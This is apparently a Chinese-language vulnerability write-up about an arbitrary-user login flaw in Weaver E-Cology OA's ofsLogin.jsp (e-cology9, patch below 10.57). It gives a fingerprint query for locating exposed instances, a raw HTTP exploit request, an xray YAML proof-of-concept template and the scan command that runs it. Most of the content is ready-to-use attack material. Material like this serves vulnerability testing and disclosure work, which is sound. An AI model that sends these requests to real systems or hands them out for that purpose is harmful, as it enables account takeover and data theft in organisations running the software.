# 泛微OA E-Cology ofsLogin.jsp 前台任意用户登录漏洞
## 漏洞描述

由于系统未对系统接口的响应进行合理的处理，导致该系统会泄漏已注册用户信息，攻击者可利用信息泄露漏洞获取注册用户的信息。另外由于系统使用了不当的算法设计，导致攻击者可模拟任意用户登录系统。

## 影响版本
```
部分 e-cology9 且补丁版本 < 10.57
```

## 网络测绘
```
body="qrcode_wev8.png"
```

## 环境搭建

-
## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201518310.png)
## 数据包
```
GET /mobile/plugin/1/ofsLogin.jsp?gopage=3&loginTokenFromThird=&receiver=test&syscode=syscode&timestamp=2&%7B%22key%22%3A+%22value%22%7D= HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

## YAML代码
```
name: poc-yaml-ecology-ofslogin-everyonelogin
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird=
    expression: response.status == 200 && response.body.bcontains(b'/login/Login.jsp') && response.body.bcontains(b'location.replace')
expression: r0()
detail:
  author: klear
  links:
    - https://github.com/A0WaQ4/Weaver_ofslogin_vul/blob/main/ecology_ofsLogin_brute.py
    - https://stack.chaitin.com/techblog/detail?id=90

```

## xray调用

```
xraypro ws --poc poc-yaml-ecology-ofsLogin-everyoneLogin.yml --url xx.xx.xx.xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201521606.png)
